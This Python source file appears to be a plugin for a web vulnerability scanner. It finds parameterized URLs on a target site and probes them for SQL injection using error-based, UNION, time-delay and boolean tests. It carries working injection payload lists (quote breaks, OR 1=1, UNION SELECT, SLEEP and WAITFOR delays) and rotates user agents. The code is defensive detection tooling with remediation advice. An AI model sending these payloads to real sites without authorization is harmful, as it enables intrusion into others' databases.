"""SQL injection multi-method detector (critical findings).

Non-destructive, four detection methods:
1. Error-based: single quote probe, look for DB error strings
2. UNION-based: column-count error confirms injectability
3. Time-based blind: SLEEP/pg_sleep payloads, measure delay
4. Boolean-based blind: compare AND 1=1 vs AND 1=2 responses
No data extraction, no stacked queries. Authorized testing only.

Scheduling: round-based. Error-based sweeps every URL first, then
UNION, then the expensive blind methods - so a timeout still leaves
full cheap-method coverage instead of burning the budget on the
first few URLs.
"""
from __future__ import annotations

import asyncio
import re
import time
from typing import List
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from ..classifier import domain_from_target
from ..ratelimit import fetch
from ..net import web_base
from .base import Cost, Ctx, Finding, Plugin, PluginResult, Target
from .injutil import sample_urls

SQL_ERRORS = [
    (r"SQL syntax.*?MySQL", "MySQL"),
    (r"Warning.*mysql_.*", "MySQL"),
    (r"valid MySQL result", "MySQL"),
    (r"MySqlClient\.", "MySQL"),
    (r"mysqli?::", "MySQL"),
    (r"PostgreSQL.*?ERROR|ERROR.*?PostgreSQL|pg_query\(\).*?ERROR", "PostgreSQL"),
    (r"Warning.*\Wpg_.*", "PostgreSQL"),
    (r"valid PostgreSQL result", "PostgreSQL"),
    (r"Npgsql\.", "PostgreSQL"),
    (r"Driver.*? SQL[\-\_\ ]*Server", "MSSQL"),
    (r"OLE DB.*? SQL Server", "MSSQL"),
    (r"SQLServer JDBC Driver", "MSSQL"),
    (r"Unclosed quotation mark", "MSSQL"),
    (r"ORA-[0-9]{5}", "Oracle"),
    (r"Oracle error", "Oracle"),
    (r"Oracle.*Driver", "Oracle"),
    (r"SQLite3::", "SQLite"),
    (r"sqlite3\.OperationalError", "SQLite"),
    (r"SQLite/JDBCDriver", "SQLite"),
    (r"Microsoft Access Driver", "MS Access"),
    (r"ODBC Driver", "ODBC"),
    (r"JDBC.*SQLException", "JDBC"),
    (r"supplied argument is not a valid", "PHP DB"),
]

REMEDIATION = ("Use parameterized queries / prepared statements everywhere. "
               "Never build SQL by string concatenation. Apply least-privilege "
               "DB accounts and hide error details in production.")

# Error-based payloads
SQLI_ERROR_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR 1=1-- ",
    "' OR '1'='1' -- ",
    '" OR "1"="1',
    "') OR ('1'='1",
    "1' AND '1'='1",
    "%27",
    # stacked queries (detection only, no destructive statements)
    "'; SELECT 1-- ",
    "'; SELECT pg_sleep(0)-- ",
    # inline comments
    "'/**/OR/**/1=1-- ",
    "'/**/UNION/**/SELECT/**/1-- ",
    "1'/**/AND/**/'1'='1",
    # polyglot payloads (break out of multiple contexts)
    "'\"--",
    "')) OR (('1'='1",
    "')))) OR (((('1'='1",
    # comment-style terminators
    "'#",
    "'/*",
    "' OR '1'='1'/*",
]

# UNION-based detection payloads
SQLI_UNION_PAYLOADS = [
    "' UNION SELECT 1-- ",
    "' UNION SELECT 1,2-- ",
    "' UNION SELECT 1,2,3-- ",
    "' UNION ALL SELECT NULL-- ",
    # inline comment variants
    "'/**/UNION/**/SELECT/**/1,2-- ",
    "'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL-- ",
    # stacked query variants (detection only)
    "'; SELECT 1,2-- ",
    "'; SELECT NULL,NULL,NULL-- ",
]

# Probe tiers: tier 1 holds the most discriminating payloads per method.
# All plugins share one 50rps rate limiter per host, so on a full scan a
# payload-heavy plugin may not finish its whole list before the timeout.
# Tier 1 sweeps EVERY url x param first (bare quote, classic UNION);
# tier 2 adds the remaining variants only if budget remains. This is the
# difference between "V01 found in 20s" and "timeout with zero findings".
SQLI_ERROR_T1 = ["'", '"', "' OR '1'='1"]
SQLI_UNION_T1 = ["' UNION SELECT 1-- ", "' UNION SELECT 1,2-- "]

# Time-based blind payloads: (payload, db_label)
SQLI_TIME_PAYLOADS = [
    ("' AND SLEEP(5)-- ", "MySQL"),
    ("'; WAITFOR DELAY '0:0:5'-- ", "MSSQL"),
    ("' AND pg_sleep(5)-- ", "PostgreSQL"),
    ("1' AND SLEEP(5)-- ", "MySQL"),
    # inline comment variants
    ("'/**/AND/**/SLEEP(5)-- ", "MySQL"),
    ("'/**/AND/**/pg_sleep(5)-- ", "PostgreSQL"),
    # Oracle (DBMS_LOCK / UTL_INADDR time delays)
    ("' AND 1=DBMS_LOCK.SLEEP(5)-- ", "Oracle"),
    ("' AND 1=UTL_INADDR.GET_HOST_ADDRESS('1')-- ", "Oracle"),
    # stacked query variants
    ("'; SELECT SLEEP(5)-- ", "MySQL"),
    ("'; SELECT pg_sleep(5)-- ", "PostgreSQL"),
]


class SqliPlugin(Plugin):
    id = "sqli"
    aggressive = True  # suppressed on WAF-protected hosts
    label = "SQLi Probe"
    accepts = ["domain", "url"]
    passive = False
    cost = Cost.FREE
    group = "web"
    # SQLi is the most payload-heavy probe class (40+ payloads x params x
    # URLs). Give it the runner's full per-plugin budget so slow/large
    # sites still get UNION/time/boolean coverage instead of dying at 60s.
    timeout_s = 120
    description = "SQLi check: error-based + UNION + time-blind + boolean-blind."

    async def run(self, target: Target, ctx: Ctx) -> PluginResult:
        t0 = time.monotonic()
        domain = domain_from_target(target.type, target.normalized)
        if not domain:
            return self._skipped("no domain for this target type")
        mode = self.module_mode(ctx)
        if mode == "passive":
            return self._skipped("needs active mode (sends probe requests)")
        base = await web_base(ctx, target, domain)
        findings: List[Finding] = []

        # discover URLs with query params from the homepage
        try:
            r = await fetch(ctx.http, ctx.limiter, "GET", base, rotate_ua=True, timeout=25,
                            follow_redirects=True)
            html = r.text[:300000]
            page_url = str(r.url)
        except Exception as e:
            res = self._degraded(f"fetch failed: {str(e)[:200]}")
            res.duration_ms = int((time.monotonic() - t0) * 1000)
            return res

        urls = set()
        for m in re.finditer(r'href=["\']([^"\']+\?[^"\']+)["\']', html, re.I):
            u = m.group(1)
            if u.startswith("/"):
                p = urlparse(page_url)
                u = f"{p.scheme}://{p.netloc}{u}"
            if domain in urlparse(u).netloc:
                urls.add(u)
        for m in re.finditer(r'<form[^>]+action=["\']([^"\']*)["\']', html, re.I):
            a = m.group(1) or page_url
            if a.startswith("/"):
                p = urlparse(page_url)
                a = f"{p.scheme}://{p.netloc}{a}"
            if "?" in a and domain in urlparse(a).netloc:
                urls.add(a)
        for eu in ctx.consume("endpoints"):
            if isinstance(eu, str) and "?" in eu and \
                    domain in urlparse(eu).netloc:
                urls.add(eu)

        # ---- Phase A: baselines for every URL (concurrent) ----
        # Round-based scheduling (false-negative fix): the old code ran
        # ALL four methods per-URL, so on targets with many parameterized
        # URLs the plugin burned its whole budget on the first few URLs
        # and never reached UNION/time/boolean on the rest. Now the cheap
        # high-signal methods (error-based, then UNION) sweep EVERY URL
        # first; expensive blind methods run afterwards on what remains.
        # If the runner's timeout fires mid-scan, the cheap coverage is
        # already done and confirmed findings survive via _checkpoint.
        sem = asyncio.Semaphore(6)
        tested = [0]
        confirmed = set()  # (url, param) already proven injectable

        async def baseline_one(u: str):
            parts = urlparse(u)
            params = parse_qsl(parts.query)
            if not params:
                return None
            # Baseline FP guard: only flag DB error strings, timing
            # delays, or content diffs that appear AFTER our payload but
            # NOT in the normal response. Normal pages (docs, blogs about
            # databases) legitimately contain strings like "MySQL" or
            # "SQL syntax" - those are not vulnerabilities.
            baseline_body = ""
            baseline_t = 0.0
            try:
                b0 = time.monotonic()
                br = await fetch(ctx.http, ctx.limiter, "GET", u,
                                 rotate_ua=True, timeout=15, max_retries=1)
                baseline_t = time.monotonic() - b0
                baseline_body = br.text[:200000]
            except Exception:
                pass
            # Which error patterns already exist in normal traffic?
            baseline_hits = set()
            for pat, db in SQL_ERRORS:
                if re.search(pat, baseline_body, re.I | re.S):
                    baseline_hits.add(pat)
            return (u, parts, params, baseline_body, baseline_t,
                    baseline_hits)

        async def baseline_sem(u: str):
            async with sem:
                return await baseline_one(u)

        items = [it for it in await asyncio.gather(
            *[baseline_sem(u) for u in sample_urls(urls, 12)]) if it]

        def probe_purl(parts, params, name, suffix):
            probe = [(n, (v + suffix) if n == name else v)
                     for n, v in params]
            return urlunparse(parts._replace(query=urlencode(probe)))

        # ---- Method 1: Error-based ----
        async def method_error(item, name, val, payloads=SQLI_ERROR_PAYLOADS):
            u, parts, params, baseline_body, baseline_t, baseline_hits = item
            for payload in payloads:
                tested[0] += 1
                purl = probe_purl(parts, params, name, payload)
                try:
                    pr = await fetch(ctx.http, ctx.limiter, "GET", purl,
                                     rotate_ua=True, timeout=15, max_retries=1)
                    body = pr.text[:200000]
                except Exception:
                    continue
                for pat, db in SQL_ERRORS:
                    # Skip patterns already present in baseline (not ours)
                    if pat in baseline_hits:
                        continue
                    if re.search(pat, body, re.I | re.S):
                        findings.append(self._f(
                            "leak", "sqli_error_based",
                            f"CRITICAL: SQL injection in parameter "
                            f"'{name}' ({db} error leaked) at "
                            f"{parts.path or '/'}",
                            source="sqli probe", source_url=purl,
                            confidence=85, passive=False,
                            evidence={"severity": "critical",
                                      "method": "error-based",
                                      "parameter": name,
                                      "database": db,
                                      "payload": payload,
                                      "remediation": REMEDIATION,
                                      "scope_note": "Authorized testing only. "
                                                    "Do not exploit beyond detection."}))
                        return True
            return False

        # ---- Method 2: UNION-based ----
        async def method_union(item, name, val, payloads=SQLI_UNION_PAYLOADS):
            u, parts, params, baseline_body, baseline_t, baseline_hits = item
            for payload in payloads:
                tested[0] += 1
                purl = probe_purl(parts, params, name, payload)
                try:
                    pr = await fetch(ctx.http, ctx.limiter, "GET", purl,
                                     rotate_ua=True, timeout=15, max_retries=1)
                    body = pr.text[:200000]
                except Exception:
                    continue
                # UNION success: page renders differently without error
                # Check for UNION-specific DB errors (column count mismatch).
                # Skip patterns already in the baseline (FP guard).
                if re.search(r"(column.*?mismatch|different number of columns|"
                             r"UNION.*types? (are|do) not match|"
                             r"SELECTs? to the left and right)",
                             body, re.I):
                    if re.search(r"(column.*?mismatch|different number of columns|"
                                 r"UNION.*types? (are|do) not match|"
                                 r"SELECTs? to the left and right)",
                                 baseline_body, re.I):
                        continue
                    findings.append(self._f(
                        "leak", "sqli_union_based",
                        f"CRITICAL: UNION-based SQL injection in parameter "
                        f"'{name}' at {parts.path or '/'} "
                        f"(column count error confirms injectability).",
                        source="sqli probe", source_url=purl,
                        confidence=80, passive=False,
                        evidence={"severity": "critical",
                                  "method": "union-based",
                                  "parameter": name,
                                  "payload": payload,
                                  "remediation": REMEDIATION,
                                  "scope_note": "Authorized testing only."}))
                    return True
            return False

        # ---- Method 3: Time-based blind ----
        # Baseline-aware: only flag if the delay clearly exceeds the
        # normal response time. A slow server or congested network can
        # add seconds of latency to ANY request - that's not SQLi.
        #
        # Queue-wait fix (2026-10-23): every plugin shares one 50rps
        # limiter. Under a full scan the queue backs up monotonically
        # (10s->24s of pure queue wait observed) and plain wall-clock
        # measurements mistook queue wait for server-side SLEEP delays -
        # false time-blind positives that blocked the real boolean round
        # (V04 missed) via the confirmed-set. Fix: measure a benign
        # CONTROL back-to-back BEFORE each payload. Both traverse the
        # same queue, so only true server-side delay survives the
        # comparison. The control MUST come first: a 5s SLEEP payload
        # lets the shared queue build up behind it, so a post-payload
        # control sees a worse queue and true positives get rejected.
        async def method_time(item, name, val):
            u, parts, params, baseline_body, baseline_t, baseline_hits = item
            # Fresh control for this param, measured before any payload.
            try:
                c0 = time.monotonic()
                await fetch(ctx.http, ctx.limiter, "GET", u, rotate_ua=True,
                            timeout=20, max_retries=1)
                control_delta = time.monotonic() - c0
            except Exception:
                control_delta = baseline_t
            for payload, db in SQLI_TIME_PAYLOADS:
                tested[0] += 1
                purl = probe_purl(parts, params, name, payload)
                try:
                    p0 = time.monotonic()
                    await fetch(ctx.http, ctx.limiter, "GET", purl,
                                rotate_ua=True, timeout=20, max_retries=1)
                    delta = time.monotonic() - p0
                except Exception:
                    continue
                # Require: absolute delay >= 4s AND at least 3s above the
                # back-to-back control. Filters out slow servers AND
                # limiter-queue inflation.
                if delta < 4.0 or (delta - control_delta) < 3.0:
                    continue
                findings.append(self._f(
                    "leak", "sqli_time_blind",
                    f"CRITICAL: time-based blind SQL injection in "
                    f"parameter '{name}' ({db}, ~{delta:.1f}s delay) "
                    f"at {parts.path or '/'}",
                    source="sqli probe", source_url=purl,
                    confidence=75, passive=False,
                    evidence={"severity": "critical",
                              "method": "time-based blind",
                              "parameter": name,
                              "database": db,
                              "delay_s": round(delta, 1),
                              "remediation": REMEDIATION,
                              "scope_note": "Authorized testing only."}))
                return True
            return False

        # ---- Method 4: Boolean-based blind ----
        # Stability guard: fetch the baseline URL twice. If the two
        # baseline responses already differ by >15%, the page has
        # dynamic content (timestamps, CSRF tokens, ads) and any
        # true/false diff is meaningless - skip to avoid FPs.
        # Compare AND 1=1 (true) vs AND 1=2 (false) response lengths
        async def method_boolean(item, name, val):
            u, parts, params, baseline_body, baseline_t, baseline_hits = item
            tested[0] += 2
            try:
                b1r = await fetch(ctx.http, ctx.limiter, "GET", u, rotate_ua=True,
                                  timeout=15, max_retries=1)
                b2r = await fetch(ctx.http, ctx.limiter, "GET", u, rotate_ua=True,
                                  timeout=15, max_retries=1)
                b1_len, b2_len = len(b1r.text), len(b2r.text)
                if b1_len > 0 and b2_len > 0:
                    base_diff = abs(b1_len - b2_len) / max(b1_len, b2_len)
                    if base_diff > 0.15:
                        # Page is dynamic - boolean test unreliable
                        return False
                true_probe = [(n, (v + "' AND '1'='1") if n == name else v)
                              for n, v in params]
                false_probe = [(n, (v + "' AND '1'='2") if n == name else v)
                               for n, v in params]
                true_url = urlunparse(parts._replace(
                    query=urlencode(true_probe)))
                false_url = urlunparse(parts._replace(
                    query=urlencode(false_probe)))
                tr = await fetch(ctx.http, ctx.limiter, "GET", true_url,
                                 rotate_ua=True, timeout=15, max_retries=1)
                fr = await fetch(ctx.http, ctx.limiter, "GET", false_url,
                                 rotate_ua=True, timeout=15, max_retries=1)
                true_len = len(tr.text)
                false_len = len(fr.text)
                # Significant difference suggests boolean-based SQLi.
                # Raised from 0.3 to 0.5: small diffs are normal page
                # variance; only large structural changes count.
                if true_len > 0 and false_len > 0:
                    diff_ratio = abs(true_len - false_len) / max(true_len,
                                                                false_len)
                    if diff_ratio > 0.5:
                        findings.append(self._f(
                            "leak", "sqli_boolean_blind",
                            f"HIGH: possible boolean-based blind SQL injection "
                            f"in parameter '{name}' at {parts.path or '/'} "
                            f"(response differs {diff_ratio:.0%} between "
                            f"true/false conditions).",
                            source="sqli probe", source_url=true_url,
                            confidence=60, passive=False,
                            evidence={"severity": "high",
                                      "method": "boolean-based blind",
                                      "parameter": name,
                                      "true_len": true_len,
                                      "false_len": false_len,
                                      "remediation": REMEDIATION,
                                      "scope_note": "Candidate: verify manually. "
                                                    "Authorized testing only."}))
                        return True
            except Exception:
                pass
            return False

        async def run_round(method, payloads=None):
            async def one(item):
                u = item[0]
                for name, val in item[2][:3]:
                    if (u, name) in confirmed:
                        continue
                    if payloads is not None:
                        hit = await method(item, name, val, payloads)
                    else:
                        hit = await method(item, name, val)
                    if hit:
                        confirmed.add((u, name))
            async def one_sem(item):
                async with sem:
                    await one(item)
            await asyncio.gather(*[one_sem(it) for it in items])
            # Checkpoint confirmed findings: if the runner kills this
            # plugin on timeout, the findings from finished rounds
            # survive instead of being discarded with the in-flight work.
            self._checkpoint(findings)

        # Tiered rounds: the most discriminating probes sweep every URL
        # first (tier 1), then the expensive blind methods run on what is
        # still unconfirmed, and only then do the remaining payload
        # variants add depth. Method coverage beats variant depth: finding
        # all four SQLi methods matters more than trying the 17th quote
        # variant. Budget guard between rounds leaves headroom for a clean
        # exit.
        error_t2 = [p for p in SQLI_ERROR_PAYLOADS if p not in SQLI_ERROR_T1]
        union_t2 = [p for p in SQLI_UNION_PAYLOADS if p not in SQLI_UNION_T1]
        rounds = [
            (method_error, SQLI_ERROR_T1),
            (method_union, SQLI_UNION_T1),
            (method_time, None),
            (method_boolean, None),
            (method_error, error_t2),
            (method_union, union_t2),
        ]
        for method, payloads in rounds:
            if (time.monotonic() - t0) > 100:
                break
            await run_round(method, payloads)

        dur = int((time.monotonic() - t0) * 1000)
        res = self._ok(findings, f"probed {tested[0]} payloads across "
                                 f"{len(items)} URLs, {len(findings)} SQLi signals")
        res.duration_ms = dur
        return res
